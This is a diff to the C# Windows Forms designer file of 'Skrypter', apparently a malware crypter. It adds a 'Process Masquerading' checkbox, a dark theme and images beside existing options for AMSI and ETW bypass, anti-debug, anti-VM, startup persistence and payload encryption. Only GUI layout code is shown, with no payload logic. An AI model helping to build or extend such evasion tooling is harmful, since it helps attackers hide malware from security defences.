@@ -28,9 +28,11 @@
         /// </summary>
         private void InitializeComponent()
         {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmCrypter));
             this.inputfile = new System.Windows.Forms.TextBox();
             this.button1 = new System.Windows.Forms.Button();
             this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.processMasquerading = new System.Windows.Forms.CheckBox();
             this.armdotObfuscation = new System.Windows.Forms.CheckBox();
             this.polymorphicAes = new System.Windows.Forms.CheckBox();
             this.startup = new System.Windows.Forms.CheckBox();
@@ -45,13 +47,18 @@
             this.aes = new System.Windows.Forms.RadioButton();
             this.aes256 = new System.Windows.Forms.RadioButton();
             this.button2 = new System.Windows.Forms.Button();
+            this.pictureBox2 = new System.Windows.Forms.PictureBox();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
             this.SuspendLayout();
             // 
             // inputfile
             // 
-            this.inputfile.Location = new System.Drawing.Point(16, 13);
+            this.inputfile.BackColor = System.Drawing.Color.Black;
+            this.inputfile.Location = new System.Drawing.Point(64, 156);
             this.inputfile.Margin = new System.Windows.Forms.Padding(6);
             this.inputfile.Name = "inputfile";
             this.inputfile.Size = new System.Drawing.Size(526, 31);
@@ -59,17 +66,19 @@
             // 
             // button1
             // 
-            this.button1.Location = new System.Drawing.Point(554, 13);
+            this.button1.BackColor = System.Drawing.Color.Black;
+            this.button1.Location = new System.Drawing.Point(602, 156);
             this.button1.Margin = new System.Windows.Forms.Padding(6);
             this.button1.Name = "button1";
             this.button1.Size = new System.Drawing.Size(130, 38);
             this.button1.TabIndex = 1;
             this.button1.Text = "...";
-            this.button1.UseVisualStyleBackColor = true;
+            this.button1.UseVisualStyleBackColor = false;
             this.button1.Click += new System.EventHandler(this.button1_Click);
             // 
             // groupBox1
             // 
+            this.groupBox1.Controls.Add(this.processMasquerading);
             this.groupBox1.Controls.Add(this.armdotObfuscation);
             this.groupBox1.Controls.Add(this.polymorphicAes);
             this.groupBox1.Controls.Add(this.startup);
@@ -79,7 +88,7 @@
             this.groupBox1.Controls.Add(this.amsiBypass);
             this.groupBox1.Controls.Add(this.antiDebug);
             this.groupBox1.Controls.Add(this.antiVM);
-            this.groupBox1.Location = new System.Drawing.Point(16, 63);
+            this.groupBox1.Location = new System.Drawing.Point(64, 196);
             this.groupBox1.Margin = new System.Windows.Forms.Padding(6);
             this.groupBox1.Name = "groupBox1";
             this.groupBox1.Padding = new System.Windows.Forms.Padding(6);
@@ -88,10 +97,24 @@
             this.groupBox1.TabStop = false;
             this.groupBox1.Text = "Options";
             // 
+            // processMasquerading
+            // 
+            this.processMasquerading.AutoSize = true;
+            this.processMasquerading.ForeColor = System.Drawing.Color.Lime;
+            this.processMasquerading.Location = new System.Drawing.Point(402, 123);
+            this.processMasquerading.Margin = new System.Windows.Forms.Padding(6);
+            this.processMasquerading.Name = "processMasquerading";
+            this.processMasquerading.Size = new System.Drawing.Size(265, 29);
+            this.processMasquerading.TabIndex = 8;
+            this.processMasquerading.Text = "Process Masquerading";
+            this.processMasquerading.UseVisualStyleBackColor = true;
+            // 
             // armdotObfuscation
             // 
             this.armdotObfuscation.AutoSize = true;
-            this.armdotObfuscation.Location = new System.Drawing.Point(452, 137);
+            this.armdotObfuscation.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.armdotObfuscation.ForeColor = System.Drawing.Color.Lime;
+            this.armdotObfuscation.Location = new System.Drawing.Point(453, 81);
             this.armdotObfuscation.Margin = new System.Windows.Forms.Padding(6);
             this.armdotObfuscation.Name = "armdotObfuscation";
             this.armdotObfuscation.Size = new System.Drawing.Size(215, 29);
@@ -102,17 +125,19 @@
             // polymorphicAes
             // 
             this.polymorphicAes.AutoSize = true;
-            this.polymorphicAes.Location = new System.Drawing.Point(514, 89);
+            this.polymorphicAes.ForeColor = System.Drawing.Color.Lime;
+            this.polymorphicAes.Location = new System.Drawing.Point(24, 163);
             this.polymorphicAes.Margin = new System.Windows.Forms.Padding(6);
             this.polymorphicAes.Name = "polymorphicAes";
-            this.polymorphicAes.Size = new System.Drawing.Size(210, 29);
+            this.polymorphicAes.Size = new System.Drawing.Size(287, 29);
             this.polymorphicAes.TabIndex = 6;
-            this.polymorphicAes.Text = "Polymorphic AES";
+            this.polymorphicAes.Text = "Polymorphism (AES only)";
             this.polymorphicAes.UseVisualStyleBackColor = true;
             // 
             // startup
             // 
             this.startup.AutoSize = true;
+            this.startup.ForeColor = System.Drawing.Color.Lime;
             this.startup.Location = new System.Drawing.Point(514, 42);
             this.startup.Margin = new System.Windows.Forms.Padding(6);
             this.startup.Name = "startup";
@@ -124,7 +149,8 @@
             // runas
             // 
             this.runas.AutoSize = true;
-            this.runas.Location = new System.Drawing.Point(248, 123);
+            this.runas.ForeColor = System.Drawing.Color.Lime;
+            this.runas.Location = new System.Drawing.Point(214, 122);
             this.runas.Margin = new System.Windows.Forms.Padding(6);
             this.runas.Name = "runas";
             this.runas.Size = new System.Drawing.Size(176, 29);
@@ -135,6 +161,7 @@
             // obfuscator
             // 
             this.obfuscator.AutoSize = true;
+            this.obfuscator.ForeColor = System.Drawing.Color.Lime;
             this.obfuscator.Location = new System.Drawing.Point(248, 81);
             this.obfuscator.Margin = new System.Windows.Forms.Padding(6);
             this.obfuscator.Name = "obfuscator";
@@ -146,6 +173,7 @@
             // etwBypass
             // 
             this.etwBypass.AutoSize = true;
+            this.etwBypass.ForeColor = System.Drawing.Color.Lime;
             this.etwBypass.Location = new System.Drawing.Point(248, 42);
             this.etwBypass.Margin = new System.Windows.Forms.Padding(6);
             this.etwBypass.Name = "etwBypass";
@@ -157,6 +185,7 @@
             // amsiBypass
             // 
             this.amsiBypass.AutoSize = true;
+            this.amsiBypass.ForeColor = System.Drawing.Color.Lime;
             this.amsiBypass.Location = new System.Drawing.Point(24, 123);
             this.amsiBypass.Margin = new System.Windows.Forms.Padding(6);
             this.amsiBypass.Name = "amsiBypass";
@@ -168,6 +197,7 @@
             // antiDebug
             // 
             this.antiDebug.AutoSize = true;
+            this.antiDebug.ForeColor = System.Drawing.Color.Lime;
             this.antiDebug.Location = new System.Drawing.Point(24, 81);
             this.antiDebug.Margin = new System.Windows.Forms.Padding(6);
             this.antiDebug.Name = "antiDebug";
@@ -179,6 +209,8 @@
             // antiVM
             // 
             this.antiVM.AutoSize = true;
+            this.antiVM.Font = new System.Drawing.Font("Microsoft Sans Serif", 7.875F, System.Drawing.FontStyle.Strikeout, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.antiVM.ForeColor = System.Drawing.Color.Lime;
             this.antiVM.Location = new System.Drawing.Point(24, 42);
             this.antiVM.Margin = new System.Windows.Forms.Padding(6);
             this.antiVM.Name = "antiVM";
@@ -192,7 +224,7 @@
             this.groupBox2.Controls.Add(this.xor);
             this.groupBox2.Controls.Add(this.aes);
             this.groupBox2.Controls.Add(this.aes256);
-            this.groupBox2.Location = new System.Drawing.Point(16, 267);
+            this.groupBox2.Location = new System.Drawing.Point(64, 400);
             this.groupBox2.Margin = new System.Windows.Forms.Padding(6);
             this.groupBox2.Name = "groupBox2";
             this.groupBox2.Padding = new System.Windows.Forms.Padding(6);
@@ -204,6 +236,7 @@
             // xor
             // 
             this.xor.AutoSize = true;
+            this.xor.ForeColor = System.Drawing.Color.Lime;
             this.xor.Location = new System.Drawing.Point(514, 46);
             this.xor.Margin = new System.Windows.Forms.Padding(6);
             this.xor.Name = "xor";
@@ -215,6 +248,7 @@
             // aes
             // 
             this.aes.AutoSize = true;
+            this.aes.ForeColor = System.Drawing.Color.Lime;
             this.aes.Location = new System.Drawing.Point(276, 46);
             this.aes.Margin = new System.Windows.Forms.Padding(6);
             this.aes.Name = "aes";
@@ -227,6 +261,7 @@
             // 
             this.aes256.AutoSize = true;
             this.aes256.Checked = true;
+            this.aes256.ForeColor = System.Drawing.Color.Lime;
             this.aes256.Location = new System.Drawing.Point(32, 46);
             this.aes256.Margin = new System.Windows.Forms.Padding(6);
             this.aes256.Name = "aes256";
@@ -238,25 +273,51 @@
             // 
             // button2
             // 
-            this.button2.Location = new System.Drawing.Point(16, 392);
+            this.button2.BackColor = System.Drawing.Color.Black;
+            this.button2.ForeColor = System.Drawing.Color.Lime;
+            this.button2.Location = new System.Drawing.Point(64, 525);
             this.button2.Margin = new System.Windows.Forms.Padding(6);
             this.button2.Name = "button2";
             this.button2.Size = new System.Drawing.Size(668, 71);
             this.button2.TabIndex = 5;
             this.button2.Text = "Build";
-            this.button2.UseVisualStyleBackColor = true;
+            this.button2.UseVisualStyleBackColor = false;
             this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // pictureBox2
+            // 
+            this.pictureBox2.BackgroundImage = global::Crypter.Properties.Resources.photo_2025_05_30_21_32_58;
+            this.pictureBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.pictureBox2.Location = new System.Drawing.Point(655, 12);
+            this.pictureBox2.Name = "pictureBox2";
+            this.pictureBox2.Size = new System.Drawing.Size(130, 135);
+            this.pictureBox2.TabIndex = 7;
+            this.pictureBox2.TabStop = false;
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackgroundImage = global::Crypter.Properties.Resources.photo_2025_05_31_23_40_54;
+            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.pictureBox1.Location = new System.Drawing.Point(12, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(130, 135);
+            this.pictureBox1.TabIndex = 6;
+            this.pictureBox1.TabStop = false;
             // 
             // FrmCrypter
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(698, 481);
+            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
+            this.ClientSize = new System.Drawing.Size(797, 611);
+            this.Controls.Add(this.pictureBox2);
+            this.Controls.Add(this.pictureBox1);
             this.Controls.Add(this.button2);
             this.Controls.Add(this.groupBox2);
             this.Controls.Add(this.groupBox1);
             this.Controls.Add(this.button1);
             this.Controls.Add(this.inputfile);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Margin = new System.Windows.Forms.Padding(6);
             this.Name = "FrmCrypter";
             this.Text = "Skrypter [ALPHA] @SkeemLabs";
@@ -265,6 +326,8 @@
             this.groupBox1.PerformLayout();
             this.groupBox2.ResumeLayout(false);
             this.groupBox2.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -289,5 +352,8 @@
         private System.Windows.Forms.RadioButton aes;
         private System.Windows.Forms.CheckBox polymorphicAes;
         private System.Windows.Forms.CheckBox armdotObfuscation;
+        private System.Windows.Forms.CheckBox processMasquerading;
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.PictureBox pictureBox2;
     }
 }
